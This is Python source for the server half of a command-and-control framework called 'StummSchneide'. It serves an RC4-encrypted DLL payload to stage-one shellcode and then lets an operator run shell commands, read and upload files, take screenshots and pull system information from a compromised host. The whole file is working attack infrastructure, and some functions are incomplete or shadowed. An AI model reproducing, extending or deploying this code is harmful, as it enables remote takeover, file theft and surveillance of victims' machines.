import socket
import struct
import base64
import os
import shlex
import readline
import argparse

HOST = "0.0.0.0"
PORT = 4444
DLL_PATH = "payload.dll"
RC4_KEY = b"StummKey2026"

MAGIC_BYTE = 0x53
SENDER_SHELLCODE = 0x01
SENDER_DLL = 0x02

CMD_GET_PAYLOAD = 0x0001
CMD_DLL_HEARTBEAT = 0x0002
CMD_EXEC_CMD = 0x0003

parser = argparse.ArgumentParser(
    description='[*] Server side of StummSchneide',
    epilog='Example:\n\tpython3 server.py\n\tpython3 server.py --ip 0.0.0.0 -p 4444 --payload ./payload.dll',
    formatter_class=argparse.RawTextHelpFormatter
)

# C2 server
c2_group = parser.add_argument_group('C2 Server Options')
c2_group.add_argument('--ip', metavar='<IP>', default=HOST, help=f'C2 IPv4 listen address (default: {HOST})')
c2_group.add_argument('-p', '--port', metavar='<PORT>', default=PORT, type=int, help=f'C2 listen port (default: {PORT})')
c2_group.add_argument('--payload', metavar='<PATH>', default=DLL_PATH, help=f'File path of the DLL payload (default: {DLL_PATH})')


args = parser.parse_args()

def rc4_crypt(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    out_data = bytearray(data)
    for n in range(len(out_data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out_data[n] ^= S[(S[i] + S[j]) % 256]

    return bytes(out_data)

class RC4Stream:
    def __init__(self, key: bytes):
        self.S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + self.S[i] + key[i % len(key)]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
        self.i = 0
        self.j = 0

    def crypt(self, data: bytes) -> bytes:
        out = bytearray(data)
        for n in range(len(out)):
            self.i = (self.i + 1) % 256
            self.j = (self.j + self.S[self.i]) % 256
            self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]
            out[n] ^= self.S[(self.S[self.i] + self.S[self.j]) % 256]
        return bytes(out)

def encapsulate(input_list: list, splitter = '|'):
    if not input_list:
        return ''

    return splitter.join([base64.b64encode(str(x).encode('utf-8')).decode('utf-8') for x in input_list])

def send_command(conn: socket.socket, cmd: list):
    return send_command(conn, encapsulate(cmd))

def send_command(conn: socket.socket, cmd: str):
    cmd_bytes = cmd.encode('utf-8')
    data_len = len(cmd_bytes)
    
    cipher = RC4Stream(RC4_KEY)
    encrypted_cmd = cipher.crypt(cmd_bytes)

    pkt_header = struct.pack("<BBHI", MAGIC_BYTE, SENDER_DLL, CMD_EXEC_CMD, data_len)
    conn.sendall(pkt_header + encrypted_cmd)

    resp_len_bytes = conn.recv(4)
    if not resp_len_bytes or len(resp_len_bytes) < 4:
        return "[-] Connection lost."
    
    resp_len = struct.unpack("<I", resp_len_bytes)[0]
    
    resp_data = b""
    while len(resp_data) < resp_len:
        chunk = conn.recv(resp_len - len(resp_data))
        if not chunk:
            break
        resp_data += chunk

    dec_cipher = RC4Stream(RC4_KEY)
    dec_data = dec_cipher.crypt(resp_data)

    try:
        return dec_data.decode('cp950', errors='ignore')
    except:
        return dec_data.decode('utf-8', errors='ignore')

def do_info(conn: socket.socket):
    cmd = encapsulate(['info'])

    print('\n')
    print(send_command(conn, cmd))

def do_cmd(conn: socket.socket):
    while True:
        try:
            cmd_input = input("StummSchneide-Shell> ").strip()
            if not cmd_input:
                continue
            if cmd_input.lower() in ["exit", "quit"]:
                break

            cmd_input = encapsulate(['cmd', 'exec', cmd_input])

            print(send_command(conn, cmd_input))

        except Exception as e:
            print(f"[-] Terminal error: {e}")
            break

def do_read(conn: socket.socket, *args):
    if len(args) < 1:
        print("[-] Usage: read <REMOTE_PATH>")
        return

    remote_path = args[0]

    cmd = encapsulate(['file', 'read', remote_path])
    content = send_command(conn, cmd)

    print(f'File({remote_path}) content: \n')
    print(base64.b64decode(content).decode('utf-8'))
    print('\n')

def do_write(conn: socket.socket, *args):
    if len(args) < 2:
        print("[-] Usage: write '<STRING_CONTENT>' '<REMOTE_PATH>'")
        return

    content, remote_path = args[0], args[1]
    cmd = encapsulate(['file', 'write', remote_path, content])


def do_upload(conn: socket.socket, *args):
    if len(args) < 2:
        print("[-] Usage: upload '<LOCAL_PATH>' '<REMOTE_PATH>'")
        return

    local_path = args[0]
    remote_path = args[1]

    chunk_size = 4096

    try:
        with open(local_path, 'rb') as f:
            while True:
                chunk_data = f.read(chunk_size)
                if not chunk_data:
                    status = send_command(conn, encapsulate(['file', 'upload', remote_path, '2']))
                    if status == '2':
                        print('[+] Done')
                        
                    break

                b64_chunk = base64.b64encode(chunk_data)
                status = send_command(conn, ['file', 'upload', remote_path, '1', b64_chunk])
                if status == '0':
                    print('[-] Remote side failed to write chunk. Aborting upload.')
                    break
                elif status == '1':
                    continue

                else:
                    print(f'[-] Unknown response from target: {status}')
                    break

    except Exception as ex:
        print(f'[-] Upload error: {ex}')

def do_download(conn: socket.socket, *args):
    if len(args) < 2:
        print("[-] Usage: download '<REMOTE_PATH>' '<LOCAL_PATH>'")
        return

    remote_path, local_path = args[0], args[1]



def do_filemgr(conn: socket.socket):
    dicCmd = {
        'read': {
            'help': 'Read remote file with a specified path',
            'usage': 'read <REMOTE_PATH>',
            'action': do_read
        },
        'write': {
            'help': 'Write string content into a specified path',
            'usage': "write '<STRING_CONTENT>' '<REMOTE_PATH>'",
            'action': do_write
        },
        'upload': {
            'help': 'Upload file',
            'usage': "upload '<LOCAL_PATH>' '<REMOTE_PATH>'",
            'action': do_upload
        },
        'download': {
            'help': 'Download file',
            'usage': "download '<REMOTE_PATH>' '<LOCAL_PATH>'",
            'action': do_download
        },
        'exit': {
            'help': 'Exit filemgr',
            'usage': 'exit',
            'action': ''
        }
    }

    while True:
        try:
            cmd = input('FileMgr> ').strip()
            if not cmd:
                continue
            
            cmd_args = shlex.split(cmd)

            if len(cmd_args) == 0:
                continue

            command = cmd_args[0]

            if command == 'help':
                if len(cmd_args) == 1:
                    print('\n--- FileMgr Commands ---')
                    for c in dicCmd.keys():
                        print(f"  {c.ljust(10)} : {dicCmd[c]['help']}")
                    print('-' * 26 + '\n')
                else:
                    target_cmd = cmd_args[1]
                    if target_cmd not in dicCmd:
                        print(f'Unknown command: {target_cmd}')
                    else:
                        print(f"Example: {dicCmd[target_cmd].get('usage', 'No usage provided')}")
                continue

            if command not in dicCmd:
                print(f'[-] Unknown command: {command}')
                continue

            if command == 'exit':
                break

            action = dicCmd[command].get('action')
            if action:
                try:
                    action(conn, *cmd_args[1:])
                except Exception as e:
                    print(f'[-] Execution error: {e}')

        except Exception as ex:
            print(f"Error: {str(ex)}")
            break

def do_screenshot(conn: socket.socket):
    cmd = encapsulate(['screen'])
    b64Data = send_command(conn, cmd)

    try:
        image_bytes = base64.b64decode(b64Data)
        with open('screenshot.jpg', 'wb') as f:
            f.write(image_bytes)

    except Exception as ex:
        print(f'[-] Error: {ex}')

def do_interactive(conn: socket.socket):
    module = {
        'info' : (do_info, 'Get target system information'),
        'cmd' : (do_cmd, 'Execute shell commands'),
        'filemgr' : (do_filemgr, 'Manage files and directories'),
        'screenshot' : (do_screenshot, 'Capture target screen'),
        'exit' : ('', 'Disconnect and exit'),
    }

    while True:
        print('\n--- Available Modules ---')
        for name, (_, desc) in module.items():
            print(f'  {name.ljust(12)} : {desc}')
        print('-' * 27)
        
        option = input('Enter module: ').strip()
        if option not in module.keys():
            print(f'[!] Unknown module: {option}')
            continue

        if option == 'exit':
            send_command(conn, encapsulate(['exit']))
            conn.close()
            break

        module[option][0](conn)

def main():

    if not os.path.exists(args.payload):
        print('[-] Payload file not found: ' + args.payload)
        return

    with open(args.payload, "rb") as f:
        dll_bytes = f.read()

    dll_bytes = rc4_crypt(RC4_KEY, dll_bytes)
    dll_len = len(dll_bytes)
    
    print(f"[*] Loaded payload.dll: {dll_len} bytes")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((args.ip, args.port))
        srv.listen(5)
        print(f"[*] Listening on {args.ip}:{args.port} (RC4)...")

        while True:
            try:
                conn, addr = srv.accept()
                header_peek = conn.recv(8, socket.MSG_PEEK)
                if len(header_peek) < 8:
                    conn.close()
                    continue

                magic, sender, command, _ = struct.unpack("<BBHI", header_peek[:8])

                if magic != MAGIC_BYTE:
                    conn.close()
                    continue

                if sender == SENDER_SHELLCODE:
                    header = conn.recv(8)
                    _, _, cmd, _ = struct.unpack("<BBHI", header)
                    print(f"[+] Connection from {addr} [Stage 1 (Shellcode)]")
                    if cmd == CMD_GET_PAYLOAD:
                        conn.sendall(struct.pack("<I", dll_len))
                        conn.sendall(dll_bytes)
                        print(f"[+] Sent {dll_len} bytes of encrypted payload.")
                    conn.close()

                elif sender == SENDER_DLL:
                    print(f"[+] Connection from {addr} [Stage 2 (DLL payload)]")
                    header = conn.recv(8)
                    _, _, dll_cmd, _ = struct.unpack("<BBHI", header)
                    
                    if dll_cmd == CMD_DLL_HEARTBEAT:
                        print(f"[+] Received DLL heartbeat header.")
                        print('------------------------------')
                        print('----------[ Pwned ]-----------')
                        print('------------------------------')

                        do_interactive(conn)

            except Exception as e:
                print(f"[-] Error handling connection from {addr}: {e}")
                conn.close()

if __name__ == "__main__":
    main()